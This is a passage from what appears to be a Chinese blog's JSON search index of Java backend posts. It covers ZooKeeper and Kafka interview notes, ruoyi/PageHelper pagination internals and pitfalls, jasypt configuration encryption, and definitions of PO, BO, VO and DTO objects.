的触发条件有3个。 组成员个数发生变化。例如有新的 consumer 实例加入该消费组或者离开组。 订阅的 Topic 个数发生变化。 订阅 Topic 的分区数发生变化。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:55:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Coordinator协调过程 消费者如何发现协调者 消费者如何确定分配策略 如果需要再均衡分配策略的影响 zk的数据模型和节点类型有哪些 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:56:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"ZooKeeper数据模型 ZooKeeper的数据模型，在结构上和标准文件系统的非常相似，拥有一个层次的命名空间，都是采用树形层次结构，ZooKeeper树中的每个节点被称为—Znode。 和文件系统的目录树一样，ZooKeeper树中的每个节点可以拥有子节点。但也有不同之处： Znode兼具文件和目录两种特点。既像文件一样维护着数据、元信息、ACL、时间戳等数据结构，又像目录一样可以作为路径标识的一部分，并可以具有子Znode。用户对Znode具有增、删、改、查等操作（权限允许的情况下） Znode具有原子性操作，读操作将获取与节点相关的所有数据，写操作也将替换掉节点的所有数据。另外，每一个节点都拥有自己的ACL(访问控制列表)，这个列表规定了用户的权限，即限定了特定用户对目标节点可以执行的操作 Znode存储数据大小有限制。ZooKeeper虽然可以关联一些数据，但并没有被设计为常规的数据库或者大数据存储，相反的是，它用来管理调度数据，比如分布式应用中的配置文件信息、状态信息、汇集位置等等。这些数据的共同特性就是它们都是很小的数据，通常以KB为大小单位。ZooKeeper的服务器和客户端都被设计为严格检查并限制每个Znode的数据大小至多1M，当时常规使用中应该远小于此值 Znode通过路径引用，如同Unix中的文件路径。路径必须是绝对的，因此他们必须由斜杠字符来开头。除此以外，他们必须是唯一的，也就是说每一个路径只有一个表示，因此这些路径不能改变。在ZooKeeper中，路径由Unicode字符串组成，并且有一些限制。字符串\"/zookeeper\"用以保存管理信息，比如关键配额信息。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:57:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"节点类型 Znode有两种，分别为临时节点和永久节点。 节点的类型在创建时即被确定，并且不能改变。 临时节点：该节点的生命周期依赖于创建它们的会话。一旦会话结束，临时节点将被自动删除，当然可以也可以手动删除。临时节点不允许拥有子节点。 永久节点：该节点的生命周期不依赖于会话，并且只有在客户端显示执行删除操作的时候，他们才能被删除。 Znode还有一个序列化的特性，如果创建的时候指定的话，该Znode的名字后面会自动追加一个不断增加的序列号。序列号对于此节点的父节点来说是唯一的，这样便会记录每个子节点创建的先后顺序。它的格式为“%10d”(10位数字，没有数值的数位用0补充，例如“0000000001”) 在ZooKeeper中，每个数据节点都是有生命周期的，其生命周期的长短取决于数据节点的节点类型。 1、持久节点（PERSISTENT） 该数据节点别创建后，就会一直存在于ZooKeeper服务器上，直到有删除操作来主动删除该节点。 2、持久顺序节点（PERSISTENT_SEQUENTIAL） 持久顺序节点的基本特性和持久节点是一致的，额外的特性表现在顺序性上。在ZooKeeper中，每个父节点都会为它的第一级子节点维护一份顺序，用于记录每个子节点创建的先后顺序。 3、临时节点（EPHEMERAL） 临时节点的生命周期和客户端的回话绑定在一起，如果客户端会话失效，那么这个节点就会被自动地清理掉。 ZooKeeper规定了不能基于临时节点来创建子节点，即临时节点只能作为叶子节点。 4、临时顺序节点（EPHEMERAL_SEQUENTIAL） Zookeeper watch机制是什么 ZooKeeper是用来协调（同步）分布式进程的服务，提供了一个简单高性能的协调内核，用户可以在此之上构建更多复杂的分布式协调功能。 多个分布式进程通过ZooKeeper提供的API来操作共享的ZooKeeper内存数据对象ZNode来达成某种一致的行为或结果，这种模式本质上是基于状态共享的并发模型，与Java的多线程并发模型一致，他们的线程或进程都是”共享式内存通信“。 Java没有直接提供某种响应式通知接口来监控某个对象状态的变化，只能要么浪费CPU时间毫无响应式的轮询重试，或基于Java提供的某种主动通知（Notif）机制（内置队列）来响应状态变化，但这种机制是需要循环阻塞调用。 而ZooKeeper实现这些分布式进程的状态（ZNode的Data、Children）共享时，基于性能的考虑采用了类似的异步非阻塞的主动通知模式即Watch机制，使得分布式进程之间的“共享状态通信”更加实时高效，其实这也是ZooKeeper的主要任务决定的—协调。Consul虽然也实现了Watch机制，但它是阻塞的长轮询。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:58:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"ZooKeeper的Watch特性 Watch是一次性的，每次都需要重新注册，并且客户端在会话异常结束时不会收到任何通知，而快速重连接时仍不影响接收通知。 Watch的回调执行都是顺序执行的，并且客户端在没有收到关注数据的变化事件通知之前是不会看到最新的数据，另外需要注意不要在Watch回调逻辑中阻塞整个客户端的Watch回调 Watch是轻量级的，WatchEvent是最小的通信单元，结构上只包含通知状态、事件类型和节点路径。ZooKeeper服务端只会通知客户端发生了什么，并不会告诉具体内容。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:59:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Zookeeper状态 Disconnected：客户端是断开连接的状态，不能连接服务集合中的任意一个 SyncConnected：客户端是连接状态，连接其中的一个服务 AuthFailed：鉴权失败 ConnectedReadOnly：客户端连接只读的服务器 SaslAuthenticated：SASL认证 Expired：服务器已经过期了该客户端的Session ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:60:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Zookeeper事件类型 None：无 NodeCreated：节点创建 NodeDeleted：节点删除 NodeDataChanged：节点数据改变 NodeChildrenChanged：子节点改变（添加/删除） ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:61:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Watcher使用的注意事项 Watcher是一次触发器，假如需要持续监听数据变更，需要在每次获取时设置Watcher 会话过期：当客户端会话过期时，该客户端注册的Watcher会失效 事件丢失：在接收通知和注册监视点之间，可能会丢失事件,但Zookeeper的状态变更和数据变化，都会记录在状态元数据信息和ZK数据节点上，所以能够获取最终一致的ZK信息状态 避免Watcher过多：服务器会对每一个注册Watcher事件的客户端发送通知，通知通过Socket连接的方式发送，当Watcher过多时，会产生一个尖峰的通知 zk的命名服务、配置管理、集群管理分别是什么 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:62:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"分布式协调 大于等于一的情况下，才会有协调，在协调的事务进行分类得到一些名词，语义能够接受就可以 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:63:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"命名服务 通过使用有序节点的特性做到协调命名规则 通过zk的事务ID递增，做到有序行命名规则 通过使用自己点做map映射，做到1:N的命名映射，比如DNS 顺序关系、映射关系 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:64:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"配置管理 配置、元数据、状态等语义可以通过ZK的节点1MB存储，或者通过zk的节点目录结构特性存储 并且通过watch机制，满足配置变化的全局通知能力 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:65:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"集群管理 通过zk的排他性，有序性 满足分布式锁、分布式选主、队列锁 串行化回调调度 分布式调度等 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:66:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["Java后端","ruoyi"],"content":"ruoyi框架分页原理 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:0:0","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"分页实现 前端采用基于bootstrap的轻量级表格插件bootstrap-table(opens new window) 后端采用基于mybatis的轻量级分页插件pageHelper(opens new window) 提示 前后端分页实现流程 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:1:0","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"#前端调用实现 1、前端定义分页流程 // 一般在查询参数中定义分页变量 queryParams: { pageNum: 1, pageSize: 10 }, // 页面添加分页组件，传入分页变量 \u003cpagination v-show=\"total\u003e0\" :total=\"total\" :page.sync=\"queryParams.pageNum\" :limit.sync=\"queryParams.pageSize\" @pagination=\"getList\" /\u003e // 调用后台方法，传入参数 获取结果 listUser(this.queryParams).then(response =\u003e { this.userList = response.rows; this.total = response.total; } ); ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:1:1","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"#后台逻辑实现 @PostMapping(\"/list\") @ResponseBody public TableDataInfo list(User user) { startPage(); // 此方法配合前端完成自动分页 List\u003cUser\u003e list = userService.selectUserList(user); return getDataTable(list); } 常见坑点1：selectPostById莫名其妙的分页。例如下面这段代码 startPage(); List\u003cUser\u003e list; if(user != null){ list = userService.selectUserList(user); } else { list = new ArrayList\u003cUser\u003e(); } Post post = postService.selectPostById(1L); return getDataTable(list); 原因分析：这种情况下由于user存在null的情况，就会导致pageHelper生产了一个分页参数，但是没有被消费，这个参数就会一直保留在这个线程上。 当这个线程再次被使用时，就可能导致不该分页的方法去消费这个分页参数，这就产生了莫名其妙的分页。 上面这个代码，应该写成下面这个样子才能保证安全。 List\u003cUser\u003e list; if(user != null){ startPage(); list = userService.selectUserList(user); } else { list = new ArrayList\u003cUser\u003e(); } Post post = postService.selectPostById(1L); return getDataTable(list); 常见坑点2：添加了startPage方法。也没有正常分页。例如下面这段代码 startPage(); Post post = postService.selectPostById(1L); List\u003cUser\u003e list = userService.selectUserList(user); return getDataTable(list); 原因分析：只对该语句以后的第一个查询（Select）语句得到的数据进行分页。 上面这个代码，应该写成下面这个样子才能正常分页。 Post post = postService.selectPostById(1L); startPage(); List\u003cUser\u003e list = userService.selectUserList(user); return getDataTable(list); 注意 如果改为其他数据库需修改配置application.yml文件中的属性helperDialect=你的数据库 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:1:2","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"实现原理 1、所有的controller继承自BaseController,而在BaseController中实现了分页方法 public class BaseController { /** * 设置请求分页数据 */ protected void startPage() { PageUtils.startPage(); } } 2、在PageUtils中设置分页参数 public class PageUtils extends PageHelper { /** * 设置请求分页数据 */ public static void startPage() { PageDomain pageDomain = TableSupport.buildPageRequest(); Integer pageNum = pageDomain.getPageNum(); Integer pageSize = pageDomain.getPageSize(); String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy()); Boolean reasonable = pageDomain.getReasonable(); PageHelper.startPage(pageNum, pageSize, orderBy).setReasonable(reasonable); } /** * 清理分页的线程变量 */ public static void clearPage() { PageHelper.clearPage(); } } 3、TableSupport中获取对应的分页参数 public class TableSupport { /** * 当前记录起始索引 */ public static final String PAGE_NUM = \"pageNum\"; /** * 每页显示记录数 */ public static final String PAGE_SIZE = \"pageSize\"; /** * 排序列 */ public static final String ORDER_BY_COLUMN = \"orderByColumn\"; /** * 排序的方向 \"desc\" 或者 \"asc\". */ public static final String IS_ASC = \"isAsc\"; /** * 分页参数合理化 */ public static final String REASONABLE = \"reasonable\"; /** * 封装分页对象 */ public static PageDomain getPageDomain() { PageDomain pageDomain = new PageDomain(); //分页默认第一页 pageDomain.setPageNum(Convert.toInt(ServletUtils.getParameter(PAGE_NUM), 1)); //页大小10 pageDomain.setPageSize(Convert.toInt(ServletUtils.getParameter(PAGE_SIZE), 10)); //排序列 pageDomain.setOrderByColumn(ServletUtils.getParameter(ORDER_BY_COLUMN)); //升序降序 pageDomain.setIsAsc(ServletUtils.getParameter(IS_ASC)); //分页对象合理化 pageDomain.setReasonable(ServletUtils.getParameterToBool(REASONABLE)); return pageDomain; } public static PageDomain buildPageRequest() { return getPageDomain(); } } 4、解析PageHelper.startPage(pageNum, pageSize, orderBy).setReasonable(reasonable); pageNum：页数 pageSize：每页数据量 orderBy：排序 reasonable：分页合理化，对于不合理的分页参数自动处理，比如传递pageNum是小于0，会默认设置为1. 继续跟踪，连续点击startpage构造方法到达如下位置： /** * 开始分页 * * @param pageNum 页码 * @param pageSize 每页显示数量 * @param count 是否进行count查询 * ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:2:0","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"mybatis使用pageHelper分析 我们需要关注的就是mybatis在何时使用的这个ThreadLocal，也就是何时将分页餐数获取到的。 前面提到过，通过PageHelper的startPage()方法进行page缓存的设置，当程序执行sql接口mapper的方法时，就会被拦截器PageInterceptor拦截到。 PageHelper其实就是mybatis的分页插件，其实现原理就是通过拦截器的方式，pageHelper通PageInterceptor实现分页效果，我们只关注intercept方法： @Override public Object intercept(Invocation invocation) throws Throwable { try { Object[] args = invocation.getArgs(); MappedStatement ms = (MappedStatement) args[0]; Object parameter = args[1]; RowBounds rowBounds = (RowBounds) args[2]; ResultHandler resultHandler = (ResultHandler) args[3]; Executor executor = (Executor) invocation.getTarget(); CacheKey cacheKey; BoundSql boundSql; // 由于逻辑关系，只会进入一次 if (args.length == 4) { //4 个参数时 boundSql = ms.getBoundSql(parameter); cacheKey = executor.createCacheKey(ms, parameter, rowBounds, boundSql); } else { //6 个参数时 cacheKey = (CacheKey) args[4]; boundSql = (BoundSql) args[5]; } checkDialectExists(); //对 boundSql 的拦截处理 if (dialect instanceof BoundSqlInterceptor.Chain) { boundSql = ((BoundSqlInterceptor.Chain) dialect).doBoundSql(BoundSqlInterceptor.Type.ORIGINAL, boundSql, cacheKey); } List resultList; //调用方法判断是否需要进行分页，如果不需要，直接返回结果 if (!dialect.skip(ms, parameter, rowBounds)) { //判断是否需要进行 count 查询 if (dialect.beforeCount(ms, parameter, rowBounds)) { //查询总数 Long count = count(executor, ms, parameter, rowBounds, null, boundSql); //处理查询总数，返回 true 时继续分页查询，false 时直接返回 if (!dialect.afterCount(count, parameter, rowBounds)) { //当查询总数为 0 时，直接返回空的结果 return dialect.afterPage(new ArrayList(), parameter, rowBounds); } } resultList = ExecutorUtil.pageQuery(dialect, executor, ms, parameter, rowBounds, resultHandler, boundSql, cacheKey); } else { //rowBounds用参数值，不使用分页插件处理时，仍然支持默认的内存分页 resultList = executor.query(ms, parameter, rowBounds, resultHandler, cacheKey, boundSql); } return dialect.afterPage(resultList, parameter, rowBounds); } finally { if(dialect != null){ dialect.afterAll(); } } } 如上所示是intecept的全部代码，我们下面只关注几个终点位置： ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:3:0","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"设置分页：dialect.skip(ms, parameter, rowBounds) 此处的skip方法进行设置分页参数，内部调用方法： Page page = pageParams.getPage(parameterObject, rowBounds); 继续跟踪getPage()，发现此方法的第一行就获取了ThreadLocal的值： Page page = PageHelper.getLocalPage(); ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:3:1","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"统计数量：dialect.beforeCount(ms, parameter, rowBounds) 我们都知道，分页需要获取记录总数，所以，这个拦截器会在分页前先进行count操作。 如果count为0，则直接返回，不进行分页： //处理查询总数，返回 true 时继续分页查询，false 时直接返回 if (!dialect.afterCount(count, parameter, rowBounds)) { //当查询总数为 0 时，直接返回空的结果 return dialect.afterPage(new ArrayList(), parameter, rowBounds); } afterPage其实是对分页结果的封装方法，即使不分页，也会执行，只不过返回空列表。 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:3:2","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"分页：ExecutorUtil.pageQuery 在处理完count方法后，就是真正的进行分页了： resultList = ExecutorUtil.pageQuery(dialect, executor, ms, parameter, rowBounds, resultHandler, boundSql, cacheKey); 此方法在执行分页之前，会判断是否执行分页，依据就是前面我们通过ThreadLocal的获取的page。 当然，不分页的查询，以及新增和更新不会走到这个方法当中。 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:3:3","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"非分页：executor.query 而是会走到下面的这个分支： resultList = executor.query(ms, parameter, rowBounds, resultHandler, cacheKey, boundSql); 我们可以思考一下，如果ThreadLoad在使用后没有被清除，当执行非分页的方法时，那么就会将Limit拼接到sql后面。 为什么不分也得也会拼接？我们回头看下前面提到的dialect.skip(ms, parameter, rowBounds): 图片 如上所示，只要page被获取到了，那么这个sql，就会走前面提到的ExecutorUtil.pageQuery分页逻辑，最终导致出现不可预料的情况。 其实PageHelper对于分页后的ThreaLocal是有清除处理的。 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:3:4","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"清除TheadLocal 在intercept方法的最后，会在sql方法执行完成后，清理page缓存： finally { if(dialect != null){ dialect.afterAll(); } } 看看这个afterAll()方法: @Override public void afterAll() { //这个方法即使不分页也会被执行，所以要判断 null AbstractHelperDialect delegate = autoDialect.getDelegate(); if (delegate != null) { delegate.afterAll(); autoDialect.clearDelegate(); } clearPage(); } 只关注 clearPage()： /** * 移除本地变量 */ public static void clearPage() { LOCAL_PAGE.remove(); } ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:3:5","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端","ruoyi"],"content":"小结 到此为止，关于PageHelper的使用方式就讲解完了。 整体看下来，似乎不会存在什么问题，但是我们可以考虑集中极端情况： 如果使用了startPage()，但是没有执行对应的sql，那么就表明，当前线程ThreadLocal被设置了分页参数，可是没有被使用，当下一个使用此线程的请求来时，就会出现问题。 如果程序在执行sql前，发生异常了，就没办法执行finally当中的clearPage()方法，也会造成线程的ThreadLocal被污染。 所以，官方给我们的建议，在使用PageHelper进行分页时，执行sql的代码要紧跟startPage()方法。 除此之外，我们可以手动调用clearPage()方法，在存在问题的方法之前。 需要注意：不要分页的方法前手动调用clearPage，将会导致你的分页出现问题。 ","date":"2023-01-30","objectID":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/:4:0","tags":["ruoyi"],"title":"ruoyi框架之分页解析","uri":"/posts/ruoyi%E6%A1%86%E6%9E%B6%E4%B9%8B%E5%88%86%E9%A1%B5%E8%A7%A3%E6%9E%90/"},{"categories":["Java后端"],"content":"对于大部分项目来说，为了运维方便和项目解耦，往往会将一些和代码无关的配置抽离出来，单独放在一个配置文件中进行维护。但这类配置文件中常常含有密码等比较敏感的信息。为了避免出现敏感信息泄露等问题，采用加密等手段来增强项目的安全性是比较有必要的。本篇文章将以jasypt这个应用较为广泛的第三方依赖来进行讲解，主要基于Springboot进行应用。 一、基于Springboot项目使用jasypt进行加解密 （一）引入依赖 jasypt对应Springboot项目有着良好的支持，可以省略我们对工具类的封装。使用jasypt需要在项目中引入如下依赖： \u003c!-- spring-boot项目的依赖 --\u003e \u003cdependency\u003e \u003cgroupId\u003ecom.github.ulisesbocchio\u003c/groupId\u003e \u003cartifactId\u003ejasypt-spring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e3.0.3\u003c/version\u003e \u003c/dependency\u003e （二）配置jasypt响应的加密配置 对于加密秘钥的话，最好是不要写在配置文件中，不然别人根据你的配置就可以轻而易举地进行反推，敏感信息的加密程度就大大降低了。 jasypt: encryptor: #默认加密算法:PBEWITHHMACSHA512ANDAES_256，sha512+AES算法，安全性更高，但是需要 Java JDK 1.9+ #本服务使用jdk1.8，所以使用 PBEWithMD5AndDES md5+des算法 #默认使用 com.ulisesbocchio.jasyptspringboot.encryptor.DefaultLazyEncryptor 进行加解密 ，PooledPBEStringEncryptor可以对其加密的内容进行解密 algorithm: PBEWithMD5AndDES # 加密密钥，使用方式 spring.datasource.password=ENC(密文)，不要设置在配置文件中，建议使用环境变量或者启动参数: --jasypt.encryptor.password=123456 #加密密钥可以放在yml配置文件里，也可以放在运行参数里 password: 123456 #设置密文前缀和后缀 property: prefix: ENC( suffix: ) iv-generator-classname: org.jasypt.iv.RandomIvGenerator 除了上面的配置项之外，还有如下配置项可选 Key Required Default Value jasypt.encryptor.password True - jasypt.encryptor.algorithm False PBEWITHHMACSHA512ANDAES_256 jasypt.encryptor.key-obtention-iterations False 1000 jasypt.encryptor.pool-size False 1 jasypt.encryptor.provider-name False SunJCE jasypt.encryptor.provider-class-name False null jasypt.encryptor.salt-generator-classname False org.jasypt.salt.RandomSaltGenerator jasypt.encryptor.iv-generator-classname False org.jasypt.iv.RandomIvGenerator jasypt.encryptor.string-output-type False base64 jasypt.encryptor.proxy-property-sources False false jasypt.encryptor.skip-property-sources False empty list （三）在代码中进行测试 注意，在代码测试之前，需要保证springboot项目中有正常使用**@SpringBootApplication** 或者@EnableAutoConfiguration注解 我们可以项目中使用@Value注解来直接获取解密后的配置值 步骤零：加密工具类 package com.jindong.dailytest.utils; import org.jasypt.encryption.pbe.StandardPBEStringEncryptor; import org.jasypt.encryption.pbe.config.EnvironmentPB","date":"2022-12-28","objectID":"/posts/jasypt%E5%AE%9E%E7%8E%B0springboot%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/:0:0","tags":["Jasypt","参数加密"],"title":"Jasypt实现springboot参数加密","uri":"/posts/jasypt%E5%AE%9E%E7%8E%B0springboot%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/"},{"categories":["Java后端"],"content":"PO（Persistant Object - 持久化对象） 该概念随着ORM产生，可以看成是与数据库中的表相映射的Java对象。通常就是对应数据库中某个表中的一条记录。PO仅仅用于表示数据，没有任何数据操作。通常遵守Java Bean的规范，拥有 getter/setter方法。 PO的生命周期：是向数据库中添加新数据时创建，删除数据库中数据时削除的。并且它只能存活在一个数据库连接中，断开连接即被销毁。 PO的作用：可以把数据表中一条记录作为一个对象处理，可以方便的转为其它对象。PO是有状态的，每个属性代表其当前的状态。使用它，可以使我们的程序与物理数据解耦，并且可以简化对象数据与物理数据之间的转换。 PO的特点 ： PO的属性是跟数据库表的字段一一对应的 PO对象需要实现序列化接口 一个POJO持久化后就是PO ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:1","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"BO（Business Object - 业务对象） BO用于表示一个业务对象，它包括了业务逻辑，常常封装了对DAO和RPC等的调用，可以进行PO与VO/DTO之间的转换。 BO通常位于业务层，要区别于直接对外提供服务的服务层：BO提供了基本业务单元的基本业务操作，在设计上属于被服务层业务流程调用的对象，一个业务流程可能需要调用多个BO来完成。 ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:2","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"DO（Domain Object - 领域对象） 领域对象就是从现实世界中抽象出来的有形或无形的业务实体。通常位于业务层中。 ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:3","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"VO（Value Object/View Object - 值对象/视图对象） Value Object，值对象，也称为业务对象，是存活在业务层的，是业务逻辑使用的，它存活的目的就是为数据提供一个生存的地方（实际上跟DO有点类似）。 VO的属性是根据当前业务的不同而不同的，也就是说，它的每一个属性都一一对应当前业务逻辑所需要的数据的名称。 VO通常用于业务层之间的数据传递，其仅仅包含数据。但应是抽象出的业务对象。根据业务的需要，其可以和表对应或者不。用new关键字创建，由GC进行回收。 View Object，视图对象，用于展示层，它的作用是把某个指定页面（或组件）的所有数据封装起来，对应整个界面的值 ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:4","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"DTO（Data Transfer Object - 数据传输对象） DTO概念来源于J2EE的设计模式，原来的目的是为了EJB的分布式应用提供粗粒度的数据实体，以减少分布式调用的次数，从而提高分布式调用的性能和降低网络负载。 DTO用于表示一个数据传输对象，通常用于不同服务或服务不同分层之间的数据传输。 DTO与VO与类似，但也有一些不同，这个不同主要是设计理念上的，比如API服务需要使用的是DTO，而用于展示层页面的使用的是VO。例如，为了展示方便，在VO的性别字段存的是男和女，而在DTO中存的是1或者2这样的代码。 ","date":"2022-12-09","objectID":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/:0:5","tags":[],"title":"【Java】一图看懂Java中的PO,BO,VO,DTO,POJO,DAO,DO","uri":"/posts/java%E4%B8%80%E5%9B%BE%E7%9C%8B%E6%87%82java%E4%B8%AD%E7%9A%84pobovodtopojodaodo/"},{"categories":["Java后端"],"content":"DAO（Data Access Object - 数据访问对象） 